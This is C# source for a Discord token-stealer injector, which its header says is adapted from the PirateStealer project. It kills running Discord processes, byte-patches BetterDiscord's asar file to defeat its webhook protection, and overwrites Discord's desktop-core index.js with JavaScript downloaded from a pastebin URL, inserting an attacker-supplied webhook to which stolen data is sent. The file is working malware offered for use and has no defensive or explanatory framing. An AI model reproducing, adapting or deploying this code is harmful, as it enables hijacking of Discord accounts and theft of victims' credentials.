/*
-------------------------------------------------------
|                     IMPORTANT NOTE                    |
|                          THIS                         |
|                   IS AN EDITED VERSION                |
|                          FROM                         |
|    https://github.com/PirateStealer-GF/PirateStealer  |
-------------------------------------------------------
*/
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security;
using System.Security.Permissions;
using System.Text;

namespace PirateMonsterInjector
{
    public class Settings
    {
        public static string Webhook = "WEBHOOK_HERE";
    }
    public static class BinaryFilePatchExtensions
    {
        public static string BytesToString(this byte[] bytes, string addBetween = "")
        {
            StringBuilder sb = new StringBuilder();
            foreach (byte bite in bytes)
            {
                sb.Append(bite).Append(addBetween);
            }
            sb.Length--;
            return sb.ToString();
        }

        public static byte[] HexStringToBytes(this string hex)
        {
            try
            {
                hex = hex.CleanHexString();
                if (hex.Length % 2 == 1)
                {
                    return new byte[] { };
                }

                byte[] arr = new byte[hex.Length >> 1];

                for (int i = 0; i < hex.Length >> 1; ++i)
                {
                    arr[i] = (byte)(((hex[i << 1]).GetHexVal() << 4) + ((hex[(i << 1) + 1]).GetHexVal()));
                }
                return arr;
            }
            catch (Exception)
            {
            }

            return new byte[] { };
        }

        public static int GetHexVal(this char hex)
        {
            int val = (int)hex;
            return val - (val < 58 ? 48 : 55);
        }


        public static readonly string[] hexSeparators = { " ", "0x", "x", ":", "-" };

        public static string CleanHexString(this string hexString)
        {
            foreach (string separator in hexSeparators)
            {
                hexString = hexString.Replace(separator, string.Empty);
            }
            return hexString.ToUpper();
        }

        public static string FormatHexString(this string hexString, string placeBetweenEachHex)
        {
            string cleanedHex = hexString.CleanHexString();
            for (int i = cleanedHex.Length - 2; i > 1; i -= 2)
            {
                cleanedHex = cleanedHex.Insert(i, placeBetweenEachHex);
            }
            return cleanedHex;
        }
    }

    class Program
    {
        static void RemoveBetterDiscordProtection(string betterdiscordpath)
        {

            int exitCode = (int)ExitCodes.Success;

            string path = betterdiscordpath;
            string matchString = "6170692f776562686f6f6b73";
            string replaceString = "7374616e6c65796973676f64";
            bool replaceAllInstances = true;

            if (File.Exists(path))
            {
                var permissionSet = new PermissionSet(PermissionState.None);
                var writePermission = new FileIOPermission(FileIOPermissionAccess.Write, path);
                permissionSet.AddPermission(writePermission);

                if (permissionSet.IsSubsetOf(AppDomain.CurrentDomain.PermissionSet))
                {
                    byte[] fileBytes = File.ReadAllBytes(path);
                    byte[] matchBytes = matchString.HexStringToBytes();
                    byte[] replaceBytes = replaceString.HexStringToBytes();

                    if (matchBytes != null && matchBytes.Length > 0
                        && replaceBytes != null && replaceBytes.Length == matchBytes.Length
                        && fileBytes != null && fileBytes.Length >= matchBytes.Length)
                    {
                        exitCode = ReplaceBytes(ref fileBytes, matchBytes, replaceBytes, replaceAllInstances);
                        if (exitCode > 0)
                        {
                            File.WriteAllBytes(path, fileBytes);
                        }
                    }
                    else
                    {
                        exitCode = (int)ExitCodes.MatchAndReplaceLengthMismatch;
                    }
                }
                else
                {
                    exitCode = (int)ExitCodes.AdministrativeRightsRequired;
                }
            }
            else
            {
                exitCode = (int)ExitCodes.TargetFileNotFound;
            }
        }

        static bool BetterDiscordExists()
        {
            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BetterDiscord\\data"))
            {
                return true;
            }
            return false;
        }
        static void Main(string[] args)
        {
            var appdata2 = (Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\"+ Environment.UserName);
            foreach (var item in Process.GetProcesses())
            {
                // not pro way to kill discord
                if (item.ProcessName.Contains("iscord"))
                {
                    item.Kill();

                }
            }
            if (BetterDiscordExists())
            {
                foreach (var item in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BetterDiscord\\data"))
                {
                    if (item.EndsWith("betterdiscord.asar"))
                    {
                        try
                        {
                            RemoveBetterDiscordProtection(item);
                        }
                        catch (Exception)
                        {

                        }
                    }
                }
            }

   
            // not pro way to inject in Discord
            foreach (var item in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)))
            {
                if (item.Contains("Discord"))
                {
                    foreach (var item2 in Directory.GetDirectories(item))
                    {
                        if (Directory.GetDirectories(item).Count() > 0)
                        {

                            foreach (var item3 in Directory.GetDirectories(item2))
                            {
                                if (item3.Contains("app-"))
                                {
                                    foreach (var item4 in Directory.GetDirectories(item3))
                                    {
                                        foreach (var item5 in Directory.GetDirectories(item4))
                                        {
                                            if (item5.Contains("discord_desktop_core"))
                                            {
                                                
                                                try
                                                {
                                                    Directory.CreateDirectory(item5 + "\\PirateStealerBTW");
                                                }
                                                catch (Exception)
                                                {

                                                }
                                                foreach (var item7 in Directory.GetFiles(item5))
                                                {
                                                    if (item7.Contains("index.js"))
                                                    {
                                                        File.WriteAllText(item7, new WebClient().DownloadString("https://pastebin.com/raw/EbhLDVNJ").Replace("%WEBHOOK_LINK%", Settings.Webhook));

                                                    }

                                                }

                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }



            // not pro way to inject in Discord
            foreach (var item in Directory.GetDirectories(appdata2))
            {
                if (item.Contains("Discord"))
                {
                    foreach (var item2 in Directory.GetDirectories(item))
                    {
                        if (Directory.GetDirectories(item).Count() > 0)
                        {

                            foreach (var item3 in Directory.GetDirectories(item2))
                            {
                                if (item3.Contains("app-"))
                                {
                                    foreach (var item4 in Directory.GetDirectories(item3))
                                    {
                                        foreach (var item5 in Directory.GetDirectories(item4))
                                        {
                                            if (item5.Contains("discord_desktop_core"))
                                            {

                                                try
                                                {
                                                    Directory.CreateDirectory(item5 + "\\PirateStealerBTW");
                                                }
                                                catch (Exception)
                                                {

                                                }
                                                foreach (var item7 in Directory.GetFiles(item5))
                                                {
                                                    if (item7.Contains("index.js"))
                                                    {
                                                        File.WriteAllText(item7, new WebClient().DownloadString("https://pastebin.com/raw/EbhLDVNJ").Replace("%WEBHOOK_LINK%", Settings.Webhook));

                                                    }

                                                }

                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            foreach (var item in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Discord Inc"))
            {
                Process.Start(item);
            }

        }

        [Flags]
        enum ExitCodes : int
        {
            Success = 0,
            NotEnoughArguments = -1,
            TargetFileNotFound = -2,
            AdministrativeRightsRequired = -4,
            MatchAndReplaceLengthMismatch = -8
        }

        private static int ReplaceBytes(ref byte[] inBytes, byte[] matchBytes, byte[] replaceBytes, bool replaceAllInstances = false)
        {
            int matchLength = matchBytes.Length;
            int curMatch = 0;
            int instancesReplaced = 0;

            for (int i = 0; i < inBytes.Length; i++)
            {
                if (inBytes[i] == matchBytes[curMatch])
                {
                    curMatch++;
                    if (curMatch == matchLength)
                    {
                        ReplaceByteRange(ref inBytes, replaceBytes, i - (curMatch - 1));
                        instancesReplaced++;
                        if (replaceAllInstances)
                        {
                            curMatch = 0;
                        }
                        else
                        {
                            return 1;
                        }
                    }
                }
                else if (curMatch > 0)
                {
                    curMatch = (inBytes[i] == matchBytes[0]) ? 1 : 0;
                }
            }

            return instancesReplaced;
        }

        public static void ReplaceByteRange(ref byte[] bytes, byte[] replaceBytes, int start)
        {
            for (int i = 0; i < replaceBytes.Length; i++)
            {
                bytes[start + i] = replaceBytes[i];
            }
        }

    }
}

